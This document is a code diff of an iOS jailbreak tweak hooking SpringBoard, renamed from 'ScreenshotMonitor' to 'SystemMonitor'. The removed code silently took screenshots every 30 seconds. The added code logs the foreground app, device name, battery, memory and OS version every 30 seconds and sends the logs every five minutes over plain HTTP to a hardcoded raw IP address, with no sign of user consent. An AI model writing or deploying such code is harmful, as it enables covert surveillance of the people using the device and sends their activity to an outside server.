@@ -6,22 +6,25 @@
 // Configuration
 static NSString *API_ENDPOINT = @"http://186.190.215.38:3000/screenshots/log";
 static NSString *DEVICE_ID = nil;
-static NSMutableArray *screenshotLogs = nil;
-static const NSInteger MAX_LOGS = 5;
+static NSMutableArray *systemLogs = nil;
+static const NSInteger MAX_LOGS = 50;
 static NSTimer *sendTimer = nil;
-static NSTimer *screenshotTimer = nil;
-static os_log_t screenshot_monitor_log = NULL;
+static os_log_t system_monitor_log = NULL;
 
-// Declare SBScreenshotManager interface
-@interface SBScreenshotManager : NSObject
+// Declare interfaces
+@interface SBApplication : NSObject
+- (NSString *)bundleIdentifier;
+@end
+
+@interface SBApplicationController : NSObject
 + (id)sharedInstance;
-- (void)takeScreenshot;
+- (SBApplication *)frontmostApplication;
 @end
 
 @interface SpringBoard (ScreenshotMonitor)
-- (void)logScreenshot;
-- (void)sendScreenshotsToServer;
-- (void)takePeriodicScreenshot;
+- (void)logSystemActivity;
+- (void)sendLogsToServer;
+- (NSString *)getCurrentApp;
 @end
 
 %hook SpringBoard
@@ -30,11 +33,11 @@ static os_log_t screenshot_monitor_log = NULL;
     %orig;
     
     // Initialize os_log
-    screenshot_monitor_log = os_log_create("com.mateus.screenshotmonitor", "ScreenshotMonitor");
+    system_monitor_log = os_log_create("com.mateus.systemmonitor", "SystemMonitor");
     
     // Initialize logs array
-    if (!screenshotLogs) {
-        screenshotLogs = [NSMutableArray new];
+    if (!systemLogs) {
+        systemLogs = [NSMutableArray new];
     }
     
     // Get device ID if not set
@@ -42,99 +45,107 @@ static os_log_t screenshot_monitor_log = NULL;
         DEVICE_ID = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
     }
     
+    // Start periodic logging (every 30 seconds)
+    [NSTimer scheduledTimerWithTimeInterval:30.0
+                                   target:self
+                                 selector:@selector(logSystemActivity)
+                                 userInfo:nil
+                                  repeats:YES];
+    
     // Start periodic sending to server (every 5 minutes)
     sendTimer = [NSTimer scheduledTimerWithTimeInterval:300.0
-                                                target:self
-                                              selector:@selector(sendScreenshotsToServer)
-                                              userInfo:nil
-                                               repeats:YES];
+                                               target:self
+                                             selector:@selector(sendLogsToServer)
+                                             userInfo:nil
+                                              repeats:YES];
     
-    // Start periodic screenshots (every 30 seconds)
-    screenshotTimer = [NSTimer scheduledTimerWithTimeInterval:30.0
-                                                     target:self
-                                                   selector:@selector(takePeriodicScreenshot)
-                                                   userInfo:nil
-                                                    repeats:YES];
-    
-    os_log(screenshot_monitor_log, "[ScreenshotMonitor] Initialized with endpoint: %@", API_ENDPOINT);
+    os_log(system_monitor_log, "[SystemMonitor] Initialized with endpoint: %@", API_ENDPOINT);
 }
 
 %new
--(void)takePeriodicScreenshot {
-    // Get the shared instance of SBScreenshotManager
-    SBScreenshotManager *screenshotManager = [%c(SBScreenshotManager) sharedInstance];
-    if (screenshotManager) {
-        [screenshotManager takeScreenshot];
-        [self logScreenshot];  // Log immediately after taking screenshot
-        os_log(screenshot_monitor_log, "[ScreenshotMonitor] Taking periodic screenshot");
-    } else {
-        os_log_error(screenshot_monitor_log, "[ScreenshotMonitor] Failed to get SBScreenshotManager instance");
-    }
+-(NSString *)getCurrentApp {
+    // Get the current active application
+    SBApplicationController *appController = [%c(SBApplicationController) sharedInstance];
+    SBApplication *frontApp = [appController frontmostApplication];
+    return frontApp ? [frontApp bundleIdentifier] : @"unknown";
 }
 
 %new
--(void)logScreenshot {
+-(void)logSystemActivity {
     // Create timestamp
     NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
-    [formatter setDateFormat:@"yyyy-MM-dd'T'HH:mm:ss'Z'"];
+    [formatter setDateFormat:@"yyyy-MM-dd'T'HH:mm:ss.SSS'Z'"];
     [formatter setTimeZone:[NSTimeZone timeZoneWithName:@"UTC"]];
     NSString *timestamp = [formatter stringFromDate:[NSDate date]];
     
+    // Get system info
+    NSString *batteryLevel = [NSString stringWithFormat:@"%.0f%%", [[UIDevice currentDevice] batteryLevel] * 100];
+    NSString *memoryInfo = [NSString stringWithFormat:@"%.2f MB", [[NSProcessInfo processInfo] physicalMemory] / (1024.0 * 1024.0)];
+    NSString *currentApp = [self getCurrentApp];
+    NSString *deviceName = [[UIDevice currentDevice] name];
+    NSString *systemVersion = [[UIDevice currentDevice] systemVersion];
+    
     // Create log entry
     NSDictionary *logEntry = @{
+        @"deviceId": DEVICE_ID,
         @"timestamp": timestamp,
-        @"type": @"screenshot"
+        @"log": [NSString stringWithFormat:@"Battery: %@, Memory: %@, App: %@, Device: %@, iOS: %@",
+                batteryLevel, memoryInfo, currentApp, deviceName, systemVersion]
     };
     
     // Add to logs array
-    [screenshotLogs insertObject:logEntry atIndex:0];
+    [systemLogs insertObject:logEntry atIndex:0];
     
     // Keep only recent logs
-    if (screenshotLogs.count > MAX_LOGS) {
-        [screenshotLogs removeLastObject];
+    if (systemLogs.count > MAX_LOGS) {
+        [systemLogs removeLastObject];
     }
     
-    os_log(screenshot_monitor_log, "[ScreenshotMonitor] Screenshot logged at %@", timestamp);
+    os_log(system_monitor_log, "[SystemMonitor] System activity logged at %@", timestamp);
 }
 
 %new
--(void)sendScreenshotsToServer {
-    if (screenshotLogs.count == 0) {
+-(void)sendLogsToServer {
+    if (systemLogs.count == 0) {
         return;
     }
     
-    // Create simple string data
-    NSMutableString *dataToSend = [NSMutableString stringWithFormat:@"deviceId=%@&screenshots=", DEVICE_ID];
+    // Create JSON payload
+    NSDictionary *payload = @{
+        @"success": @YES,
+        @"data": systemLogs
+    };
     
-    // Add each screenshot timestamp
-    for (NSDictionary *log in screenshotLogs) {
-        [dataToSend appendFormat:@"%@,", log[@"timestamp"]];
-    }
+    // Convert to JSON
+    NSError *error;
+    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload
+                                                     options:0
+                                                       error:&error];
     
-    // Remove last comma
-    if (dataToSend.length > 0) {
-        [dataToSend deleteCharactersInRange:NSMakeRange(dataToSend.length - 1, 1)];
+    if (error) {
+        os_log_error(system_monitor_log, "[SystemMonitor] JSON conversion failed: %@", error.localizedDescription);
+        return;
     }
     
     // Create request
     NSURL *url = [NSURL URLWithString:API_ENDPOINT];
     NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
     [request setHTTPMethod:@"POST"];
-    [request setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
-    [request setHTTPBody:[dataToSend dataUsingEncoding:NSUTF8StringEncoding]];
+    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+    [request setHTTPBody:jsonData];
     
     // Send request
     NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request
                                                                 completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
         if (error) {
-            os_log_error(screenshot_monitor_log, "[ScreenshotMonitor] Network error: %@", error.localizedDescription);
+            os_log_error(system_monitor_log, "[SystemMonitor] Network error: %@", error.localizedDescription);
         } else {
             NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
             if (httpResponse.statusCode == 200) {
-                [screenshotLogs removeAllObjects];
-                os_log(screenshot_monitor_log, "[ScreenshotMonitor] Successfully sent screenshots to server");
+                [systemLogs removeAllObjects];
+                os_log(system_monitor_log, "[SystemMonitor] Successfully sent logs to server");
             } else {
-                os_log_error(screenshot_monitor_log, "[ScreenshotMonitor] Server error: %ld", (long)httpResponse.statusCode);
+                os_log_error(system_monitor_log, "[SystemMonitor] Server error: %ld", (long)httpResponse.statusCode);
             }
         }
     }];
@@ -146,5 +157,5 @@ static os_log_t screenshot_monitor_log = NULL;
 
 // Required constructor
 %ctor {
-    NSLog(@"[ScreenshotMonitor] Tweak loaded");
+    NSLog(@"[SystemMonitor] Tweak loaded");
 }
